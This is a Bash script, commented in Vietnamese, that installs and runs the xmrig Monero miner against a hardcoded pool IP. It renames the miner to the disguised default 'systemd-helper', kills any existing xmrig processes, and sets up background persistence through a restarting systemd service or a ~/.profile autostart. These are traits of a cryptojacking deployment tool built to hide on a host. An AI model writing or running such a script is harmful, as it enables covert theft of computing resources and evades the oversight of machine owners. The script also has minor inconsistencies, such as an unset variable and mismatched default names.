#!/bin/bash
set -e

VERSION=1.0

# ===== Usage =====
usage() {
  cat <<'EOF'
setup_miner_stock.sh v1.0
Cài & test xmrig STOCK (chính chủ GitHub) bản linux-static-x64, đổi tên tiến trình tuỳ chỉnh (mặc định: myminer).
Mặc định pool: 13.250.25.208:3333 (có thể override bằng -u/--url).

Cách dùng:
  ./setup_miner_stock.sh <WALLET> [tuỳ chọn]

Bắt buộc:
  <WALLET>               Địa chỉ ví (ví dụ: ví XMR/ETI)

Tuỳ chọn:
  -n, --name NAME        Tên tiến trình/binary mong muốn (mặc định: systemd-helper)
  -e, --email EMAIL      Email (ghép vào pass nếu cần)
  -u, --url HOST:PORT    Địa chỉ pool hoặc xmrig-proxy (host:port). Mặc định: 13.250.25.208:3333
  --tls                  Bật TLS cho kết nối pool/proxy (mặc định: tắt)
  --no-service           Tắt chế độ service systemd (mặc định BẬT)
  --service              (MẶC ĐỊNH BẬT) Tạo service systemd auto-start & auto-restart
  --background           (MẶC ĐỊNH BẬT) Tạo config_background.json (background=true) và ưu tiên chạy nền
  --no-background        Tắt background (không tạo config_background.json)
  --max-threads N        Gợi ý max-threads-hint (mặc định: 100)
  -h, --help             Hiển thị trợ giúp

Ví dụ nhanh:
  ./setup_miner_stock.sh 44...abcd -n myminer -u proxy.example.com:3333 --tls --service
EOF
}

# ===== Parse args =====
WALLET=""
MINER_NAME="systemd-helper"
EMAIL=""
POOL_URL=""
TLS=false
FORCE_NO_SERVICE=false
FORCE_SERVICE=true
MAKE_BACKGROUND=true
MAX_THREADS=100

SERVICE_NAME="${MINER_NAME}.service"

while [[ $# -gt 0 ]]; do
  case "$1" in
    -h|--help) usage; exit 0;;
    -n|--name) MINER_NAME="$2"; shift 2;;
    -e|--email) EMAIL="$2"; shift 2;;
    -u|--url) POOL_URL="$2"; shift 2;;
    --tls) TLS=true; shift;;
    --no-service) FORCE_NO_SERVICE=true; shift;;
    --service) FORCE_SERVICE=true; shift;;
    --background) MAKE_BACKGROUND=true; shift;;
    --no-background) MAKE_BACKGROUND=false; shift;;
    --max-threads) MAX_THREADS="$2"; shift 2;;
    --) shift; break;;
    -*)
      echo "Tham số không hợp lệ: $1" >&2
      usage; exit 1;;
    *)
      if [[ -z "$WALLET" ]]; then
        WALLET="$1"; shift
      else
        echo "Tham số dư: $1" >&2; usage; exit 1
      fi
      ;;
  esac
done

if [[ -z "$WALLET" ]]; then
  echo "LỖI: Thiếu <WALLET>"; usage; exit 1
fi

# ===== Pre-check =====
echo "==> setup_miner_stock.sh v$VERSION"
echo "Tên tiến trình (mặc định systemd-helper): $MINER_NAME"
echo "Ví: ${WALLET}"
[[ -n "$EMAIL" ]] && echo "Email: $EMAIL"
echo "Pool/Proxy: ${POOL_URL:-13.250.25.208:3333}"
echo "TLS: $TLS"
echo "Service ép buộc (default ON): $( $FORCE_SERVICE && echo yes || echo no )"
echo "No-service ép buộc: $( $FORCE_NO_SERVICE && echo yes || echo no )"
echo "Background config (default ON): $( $MAKE_BACKGROUND && echo yes || echo no )"
echo "max-threads-hint: $MAX_THREADS"
echo ""

for bin in curl tar grep sed awk; do
  command -v "$bin" >/dev/null || { echo "LỖI: Cần '$bin'"; exit 1; }
done

HOME_DIR="${HOME}"
INSTALL_DIR="${HOME_DIR}/c3pool"
LOG_FILE="${INSTALL_DIR}/${MINER_NAME}.log"   # giữ tên log cũ cho tương thích
TMPDIR="${HOME_DIR}/tmp_xmrig_stock_$$"
mkdir -p "$TMPDIR" "$INSTALL_DIR"

# ===== System info & computed port (tham khảo từ script gốc) =====
CPU_THREADS="$(nproc || echo 1)"
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))

get_port_based_on_hashrate() {
  local hashrate="$1"
  if   [ "$hashrate" -le "5000" ]; then echo 80
  elif [ "$hashrate" -le "25000" ]; then
    if [ "$hashrate" -gt "5000" ]; then echo 13333; else echo 443; fi
  elif [ "$hashrate" -le "50000" ]; then
    if [ "$hashrate" -gt "25000" ]; then echo 15555; else echo 14444; fi
  elif [ "$hashrate" -le "100000" ]; then
    if [ "$hashrate" -gt "50000" ]; then echo 19999; else echo 17777; fi
  elif [ "$hashrate" -le "1000000" ]; then
    echo 23333
  else
    echo "ERR"
    return 1
  fi
}

CALC_PORT="$(get_port_based_on_hashrate "$EXP_MONERO_HASHRATE" || true)"
echo "Dự đoán hashrate: ${EXP_MONERO_HASHRATE} H/s  → gợi ý port: ${CALC_PORT}"
echo ""

# ===== Stop any old miner =====
echo "[*] Dừng miner cũ (nếu có)"
( systemctl stop ${MINER_NAME}.service 2>/dev/null || true )
( killall -9 xmrig 2>/dev/null || true )
( killall -9 "${MINER_NAME}" 2>/dev/null || true )

# ===== Clean dir =====
echo "[*] Chuẩn bị thư mục ${INSTALL_DIR}"
rm -rf "${INSTALL_DIR:?}/"*
mkdir -p "$INSTALL_DIR"

# ===== Download xmrig stock: latest linux-static-x64 tarball via GitHub API =====
echo "[*] Tải xmrig STOCK (linux-static-x64) từ GitHub Releases (API)"

ASSET_URL="$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest \
  | grep browser_download_url \
  | grep linux-static-x64.tar.gz \
  | cut -d '"' -f 4)"

if [[ -z "$ASSET_URL" ]]; then
  echo "LỖI: Không lấy được link download từ GitHub API"; exit 1
fi

echo "   → ${ASSET_URL}"

curl -fsSL "$ASSET_URL" -o "${TMPDIR}/xmrig.tar.gz"
tar xf "${TMPDIR}/xmrig.tar.gz" -C "${TMPDIR}"
XBIN="$(find "${TMPDIR}" -maxdepth 2 -type f -name xmrig | head -n1)"
[[ -z "$XBIN" ]] && { echo "LỖI: Không tìm thấy binary xmrig trong gói tải"; exit 1; }
cp "$XBIN" "${INSTALL_DIR}/xmrig"
chmod +x "${INSTALL_DIR}/xmrig"
rm -rf "${TMPDIR}" || true

# ===== Rename binary to custom name =====
echo "[*] Đổi tên binary xmrig → ${MINER_NAME}"
mv "${INSTALL_DIR}/xmrig" "${INSTALL_DIR}/${MINER_NAME}"
chmod +x "${INSTALL_DIR}/${MINER_NAME}"

# ===== Prepare identifiers =====
WORKER_NAME="$(uname -n 2>/dev/null | cut -f1 -d'.' | sed -r 's/[^a-zA-Z0-9\-]+/_/g')"
[[ -z "$WORKER_NAME" ]] && WORKER_NAME="worker_$(date +%s)"
[[ -z "$WORKER_NAME" ]] && WORKER_NAME="worker_$(date +%s)"

[[ "$PASS" == "localhost" ]] && PASS="$(ip route get 1 | awk '{print $NF;exit}')" || true
[[ -z "$PASS" ]] && PASS="na"
[[ -n "$EMAIL" ]] && PASS="${PASS}:${EMAIL}"

# ===== Build config.json =====
echo "[*] Tạo config.json"
DEFAULT_URL="13.250.25.208:3333"
POOL="${POOL_URL:-$DEFAULT_URL}"
TLS_BOOL="$TLS"

cat > "${INSTALL_DIR}/config.json" <<EOF
{
  "api": { "id": null, "worker-id": "${WORKER_NAME}" },
  "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
  "autosave": true,
  "background": false,
  "colors": true,
  "title": true,
  "randomx": {
    "init": -1,
    "init-avx2": 0,
    "mode": "auto",
    "1gb-pages": false,
    "rdmsr": false,
    "wrmsr": false,
    "cache_qos": false,
    "numa": false,
    "scratchpad_prefetch_mode": 1
  },
  "cpu": {
    "enabled": true,
    "huge-pages": true,
    "huge-pages-jit": false,
    "hw-aes": null,
    "max-threads-hint": ${MAX_THREADS},
    "priority": null,
    "memory-pool": true,
    "yield": false,
    "asm": true,
    "argon2-impl": null,
    "argon2": null,
    "cn": null,
    "cn-heavy": null,
    "cn-lite": null,
    "cn-pico": null,
    "cn/2": null,
    "cn/gpu": null,
    "cn/upx2": null,
    "flex": null,
    "ghostrider": null,
    "panthera": null,
    "rx": null,
    "rx/wow": null,
    "cn-lite/0": false,
    "cn/0": false,
    "rx/xeq": "rx/wow",
    "rx/arq": "rx/wow",
    "rx/keva": "rx/wow"
  },
  "log-file": "${LOG_FILE}",
  "donate-level": 1,
  "donate-over-proxy": 1,
  "pools": [
    {
      "algo": "rx/0",
      "coin": null,
      "url": "${POOL}",
      "user": "${WALLET}.${WORKER_NAME}",
      "pass": "${WORKER_NAME}",
      "rig-id": "${WORKER_NAME}",
      "nicehash": false,
      "keepalive": true,
      "enabled": true,
      "tls": ${TLS_BOOL},
      "sni": false,
      "tls-fingerprint": null,
      "daemon": false,
      "socks5": null,
      "self-select": null,
      "submit-to-origin": false
    }
  ],
  "retries": 5,
  "retry-pause": 5,
  "print-time": 60,
  "dmi": true,
  "syslog": true,
  "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null },
  "dns": { "ipv6": false, "ttl": 30 },
  "user-agent": null,
  "verbose": 0,
  "watch": true,
  "rebench-algo": false,
  "bench-algo-time": 2,
  "algo-min-time": 0,
  "algo-perf": {},
  "pause-on-battery": false,
  "pause-on-active": false
}
EOF

if $MAKE_BACKGROUND; then
  echo "[*] Tạo config_background.json (background=true)"
  cp "${INSTALL_DIR}/config.json" "${INSTALL_DIR}/config_background.json"
  sed -i 's/"background": *false,/"background": true,/' "${INSTALL_DIR}/config_background.json"
fi

# ===== Helper miner.sh (foreground runner) =====
echo "[*] Tạo ${INSTALL_DIR}/miner.sh"
cat > "${INSTALL_DIR}/miner.sh" <<'EOF'
#!/bin/bash
MINER_NAME="${MINER_NAME:-myminer}"
CFG="${HOME}/c3pool/config_background.json"
[[ ! -f "$CFG" ]] && CFG="${HOME}/c3pool/config.json"
if ! pidof "$MINER_NAME" >/dev/null; then
  nice "${HOME}/c3pool/${MINER_NAME}" --config="$CFG" $*
else
  echo "Miner đang chạy nền. Muốn dừng thì: killall $MINER_NAME (hoặc killall $MINER_NAME)"
fi
EOF
sed -i "s/MINER_NAME:-myminer/MINER_NAME:-${MINER_NAME}/" "${INSTALL_DIR}/miner.sh"
chmod +x "${INSTALL_DIR}/miner.sh"

# ===== Service/systemd or profile autostart =====
NEED_SERVICE="$FORCE_SERVICE"
if ! $FORCE_NO_SERVICE; then
  if command -v systemctl >/dev/null; then
    NEED_SERVICE=true
  fi
fi

if $NEED_SERVICE && command -v systemctl >/dev/null; then
  echo "[*] Tạo dịch vụ systemd ${MINER_NAME}"
  SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}"
  bash -c "cat > \"$SERVICE_FILE\"" <<EOF
[Unit]
Description=Monero miner service (${MINER_NAME})

[Service]
ExecStart=${INSTALL_DIR}/${MINER_NAME} --config=${INSTALL_DIR}/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOF

  echo "[*] Bật huge pages nếu RAM > ~3.5GB"
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf
    sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  echo "[*] Khởi động service ${MINER_NAME}"
  systemctl daemon-reload
  systemctl enable ${MINER_NAME}.service
  systemctl restart ${MINER_NAME}.service
  echo "Xem log: journalctl -u ${MINER_NAME}.service -f"

else
  echo "[*] Không dùng systemd service. Thêm autostart vào ~/.profile nếu chưa có."
  if ! grep -q "c3pool/miner.sh" "${HOME_DIR}/.profile" 2>/dev/null; then
    echo "${INSTALL_DIR}/miner.sh >/dev/null 2>&1" >> "${HOME_DIR}/.profile"
  fi
  echo "[*] Chạy miner foreground để test nhanh (CTRL+C để thoát)"
  "${INSTALL_DIR}/miner.sh" || true
fi

echo ""
echo "XONG. Binary: ${INSTALL_DIR}/${MINER_NAME}"
echo "Config chính: ${INSTALL_DIR}/config.json"
echo "Service: ${SERVICE_NAME}"
$MAKE_BACKGROUND && echo "Config nền:  ${INSTALL_DIR}/config_background.json"
echo "Log file: ${LOG_FILE}"
echo ""
echo "Gợi ý giới hạn CPU (tuỳ chọn): apt-get install -y cpulimit && cpulimit -e ${MINER_NAME} -l $((75*$(nproc))) -b"
echo ""
